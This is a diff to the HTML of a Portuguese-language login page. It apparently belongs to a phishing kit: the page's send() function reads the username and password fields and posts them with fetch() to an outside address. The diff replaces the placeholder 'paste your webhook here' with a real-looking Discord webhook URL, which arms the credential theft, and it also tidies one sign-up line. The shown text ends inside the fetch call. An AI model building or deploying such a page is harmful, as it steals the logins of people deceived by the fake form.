@@ -75,7 +75,7 @@
         <button class="btn-entrar" onclick="send()">Entrar</button>
         <a href="#" style="color:#fff; text-decoration:none; font-size:14px; display:block; margin-bottom:15px;">Esqueceu a senha?</a>
         <button class="btn-secondary">Entrada rápida</button>
-        <p style="color: #fff; font-size: 14px; margin-top: 20px;">Não possui uma conta? **Cadastrar-se**</p>
+        <p style="color: #fff; font-size: 14px; margin-top: 20px;">Não possui uma conta?  Cadastrar-se</p>
     </div>
 </div>
 
@@ -88,7 +88,7 @@
     function send() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
-        const web = "COLE_AQUI_SEU_WEBHOOK"; 
+        const web = "https://discord.com/api/webhooks/1484149300991754350/QG4Qwn3sGu68Mj9Gq221Zow6uHGytBk6Smny_59O4paacJP5eRI6om39KFKiV1sLUaaQ"; 
 
         if(u && p) {
             fetch(web, {
